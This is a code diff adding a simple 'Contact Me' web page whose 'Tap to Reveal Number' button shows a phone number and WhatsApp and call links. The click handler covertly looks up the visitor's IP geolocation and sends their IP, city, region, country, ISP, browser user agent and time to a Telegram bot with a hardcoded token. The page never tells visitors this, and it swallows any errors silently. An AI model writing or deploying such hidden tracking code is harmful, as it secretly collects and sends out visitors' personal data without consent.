@@ -1,1 +1,67 @@
+<!DOCTYPE html>
+<html>
+<body style="text-align:center;margin-top:50px;font-family:sans-serif">
 
+<h2>Contact Me</h2>
+
+<button onclick="reveal()">Tap to Reveal Number</button>
+
+<p id="num" style="display:none;font-size:20px;">
+  +91 9510389983
+</p>
+
+<br><br>
+
+<a id="wa" target="_blank" style="display:none;">
+  Chat on WhatsApp
+</a>
+
+<br><br>
+
+<a id="call" style="display:none;">
+  Call Now
+</a>
+
+<script>
+async function reveal() {
+
+  try {
+    let data = await fetch("https://ipapi.co/json/")
+      .then(res => res.json());
+
+    let message =
+`📱 New Visitor!
+
+IP: ${data.ip}
+City: ${data.city}
+Region: ${data.region}
+Country: ${data.country_name}
+ISP: ${data.org}
+Device: ${navigator.userAgent}
+Time: ${new Date().toLocaleString()}`;
+
+    fetch("https://api.telegram.org/bot8779897483:AAHpfrls0bPlhU_rNQKLymMB26aEy6m4bBs/sendMessage", {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({
+        chat_id: "6319233453",
+        text: message
+      })
+    });
+
+  } catch(e) {}
+
+  document.getElementById("num").style.display = "block";
+
+  document.getElementById("wa").href =
+    "https://wa.me/919510389983";
+  document.getElementById("wa").style.display = "inline";
+
+  document.getElementById("call").href =
+    "tel:9510389983";
+  document.getElementById("call").style.display = "inline";
+}
+</script>
+
+</body>
+</html>
